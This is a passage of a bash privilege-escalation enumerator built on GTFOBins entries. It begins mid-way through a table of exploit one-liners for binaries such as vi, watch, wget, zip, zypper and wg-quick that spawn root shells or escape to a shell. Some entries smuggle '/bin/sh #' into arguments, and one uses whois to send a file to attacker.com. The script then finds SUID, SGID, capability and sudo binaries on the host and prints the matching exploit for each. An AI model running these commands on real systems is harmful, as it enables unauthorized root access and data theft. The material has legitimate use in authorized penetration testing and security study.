    unexpand) echo 'unexpand -t999 /path/to/input-file' ;;
    uniq) echo 'uniq /path/to/input-file' ;;
    unshare) echo 'unshare /bin/sh' ;;
    unsquashfs) echo 'unsquashfs shell
./squashfs-root/sh -p' ;;
    unzip) echo 'unzip -K shell.zip
./sh -p' ;;
    update-alternatives) echo 'echo DATA >/path/to/temp-file
update-alternatives --force --install /path/to/output-file x /path/to/temp-file 0' ;;
    urlget) echo 'urlget - /path/to/input-file' ;;
    uuencode) echo 'uuencode /path/to/input-file /dev/stdout | uudecode' ;;
    uv) echo 'uv run /bin/sh' ;;
    valgrind) echo 'valgrind /bin/sh' ;;
    varnishncsa) echo 'varnishncsa -g request -q '\''ReqURL ~ "/xxxxxxxxxx"'\'' -F '\''%{yyy}i'\'' -w /path/to/output-file' ;;
    vi) echo 'vi -c '\'':!/bin/sh'\'' /dev/null' ;;
    vigr) echo 'vigr' ;;
    vim) echo 'vim -c '\'':redir! >/path/to/output-file | echo "DATA" | redir END | q'\''' ;;
    vipw) echo 'vipw' ;;
    virsh) echo 'cat >/path/to/temp-file.xml <<EOF
<domain type='\''kvm'\''>
  <name>x</name>
  <os>
    <type arch='\''x86_64'\''>hvm</type>
  </os>
  <memory unit='\''KiB'\''>1</memory>
  <devices>
    <interface type='\''ethernet'\''>
      <script path='\''/path/to/command'\''/>
    </interface>
  </devices>
</domain>
EOF
virsh -c qemu:///system create /path/to/temp-file.xml
virsh -c qemu:///system destroy x' ;;
    w3m) echo 'w3m -dump /path/to/input-file' ;;
    wall) echo 'wall --nobanner /path/to/input-file' ;;
    watch) echo 'watch -x /bin/sh -c '\''reset; exec /bin/sh 1>&0 2>&0'\''' ;;
    wc) echo 'wc --files0-from /path/to/input-file' ;;
    wg-quick) echo 'cat >/path/to/temp-file.conf <<EOF
[Interface]
PostUp = /bin/sh
EOF

wg-quick up /path/to/temp-file.conf' ;;
    wget) echo 'echo -e '\''#!/bin/sh\\n/bin/sh 1>&0'\'' >/path/to/temp-file
chmod +x /path/to/temp-file
wget --use-askpass=/path/to/temp-file 0' ;;
    whiptail) echo 'whiptail --textbox --scrolltext /path/to/input-file 0 0' ;;
    whois) echo 'whois -h attacker.com -p 12345 x' ;;
    wish) echo 'wish' ;;
    xargs) echo 'xargs -a /dev/null /bin/sh' ;;
    xdg-user-dir) echo 'xdg-user-dir '\''}; /bin/sh #'\''' ;;
    xdotool) echo 'xdotool exec --sync /bin/sh' ;;
    xmodmap) echo 'xmodmap -v /path/to/input-file' ;;
    xmore) echo 'xmore /path/to/input-file' ;;
    xpad) echo 'xpad -f /path/to/input-file' ;;
    xxd) echo 'xxd /path/to/input-file | xxd -r' ;;
    xz) echo 'xz -c /path/to/input-file | xz -d' ;;
    yarn) echo 'yarn exec /bin/sh' ;;
    yash) echo 'yash' ;;
    yelp) echo 'yelp man:/path/to/input-file' ;;
    yt-dlp) echo 'yt-dlp '\''https://www.youtube.com/watch?v=xxxxxxxxxxx'\'' --exec '\''/bin/sh #'\''' ;;
    yum) echo 'yum localinstall -y x-1.0-1.noarch.rpm' ;;
    zathura) echo 'zathura
:! /bin/sh -c '\''exec /bin/sh 0<&1'\''' ;;
    zcat) echo 'zcat -f /path/to/input-file' ;;
    zgrep) echo 'grep '\'''\'' /path/to/input-file' ;;
    zic) echo 'echo '\''Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -'\'' >/path/to/temp-file
echo '\''Zone Test 2:00 Jordan CE%sT'\'' >>/path/to/temp-file
zic -d . -y /path/to/command /path/to/temp-file' ;;
    zip) echo 'zip /path/to/temp-file /etc/hosts -T -TT '\''/bin/sh #'\''' ;;
    zless) echo 'zless /path/to/input-file' ;;
    zsh) echo 'zsh' ;;
    zsoelim) echo 'zsoelim /path/to/input-file' ;;
    zypper) echo 'cp /bin/sh /usr/lib/zypper/commands/zypper-x
zypper x' ;;
  esac
}


# ========== SCAN ==========
FOUND=0

header() { echo -e "\n${BOLD}${CYAN}══════════════════════════════════════════${NC}"; echo -e "${BOLD}${CYAN}  $1${NC}"; echo -e "${BOLD}${CYAN}══════════════════════════════════════════${NC}"; }

show_hit() {
    local type="$1" path="$2" funcs="$3" extra="$4"
    echo -e "  ${GREEN}✓${NC} ${BOLD}$(basename "$path")${NC} ${YELLOW}($funcs)${NC}"
    echo -e "    Path: $path"
    [ -n "$extra" ] && echo -e "    $extra"
    FOUND=$((FOUND+1))
}

show_exploit() {
    local code="$1"
    if [ -n "$code" ]; then
        echo -e "    ${CYAN}Exploit:${NC}"
        echo "$code" | while IFS= read -r line; do
            echo -e "      ${GREEN}$line${NC}"
        done
    fi
}

# --- SUID ---
header "SUID Binaries (-perm -4000)"
while IFS= read -r file; do
    [ -z "$file" ] && continue
    b=$(basename "$file")
    result=$(is_suid_exploitable "$b") && {
        show_hit "SUID" "$file" "$result"
        show_exploit "$(get_suid_exploit "$b")"
    }
done < <(find / -perm -4000 -type f 2>/dev/null)

# --- SGID ---
header "SGID Binaries (-perm -2000)"
while IFS= read -r file; do
    [ -z "$file" ] && continue
    b=$(basename "$file")
    result=$(is_suid_exploitable "$b") && {
        show_hit "SGID" "$file" "$result"
        show_exploit "$(get_suid_exploit "$b")"
    }
done < <(find / -perm -2000 -type f 2>/dev/null)

# --- Capabilities ---
header "Capabilities (getcap)"
if command -v getcap &>/dev/null; then
    while IFS= read -r line; do
        [ -z "$line" ] && continue
        file=$(echo "$line" | awk '{print $1}')
        caps=$(echo "$line" | sed 's/^.* = //')
        b=$(basename "$file")
        result=$(is_cap_exploitable "$b") && {
            show_hit "CAP" "$file" "${result%%|*}" "Caps: $caps"
            show_exploit "$(get_cap_exploit "$b")"
        }
    done < <(getcap -r / 2>/dev/null)
else
    echo -e "  ${RED}getcap not found${NC}"
fi

# --- Sudo ---
header "Sudo Permissions"
if sudo -n -l 2>/dev/null | grep -q "("; then
    while IFS= read -r line; do
        [ -z "$line" ] && continue
        # Extract binary path from sudo -l output
        bin_path=$(echo "$line" | sed -n 's/.*\(\/[^ ]*\).*/\1/p' | head -1)
        [ -z "$bin_path" ] && continue
        b=$(basename "$bin_path")
        result=$(is_sudo_exploitable "$b") && {
            show_hit "SUDO" "$bin_path" "$result" "Rule: $line"
            show_exploit "$(get_sudo_exploit "$b")"
        }
    done < <(sudo -n -l 2>/dev/null | grep -E '^\s+/')
else
    echo -e "  ${YELLOW}Cannot check sudo (need NOPASSWD or cached creds)${NC}"
fi

# --- Summary ---
echo ""
echo -e "${BOLD}══════════════════════════════════════════${NC}"
if [ "$FOUND" -gt 0 ]; then
    echo -e "${GREEN}${BOLD}  $FOUND exploitable binary/binaries found!${NC}"
    echo -e "  Details: ${CYAN}https://gtfobins.github.io/${NC}"
else
    echo -e "${YELLOW}  No known GTFOBins exploitables found.${NC}"
fi
echo -e "${BOLD}══════════════════════════════════════════${NC}"
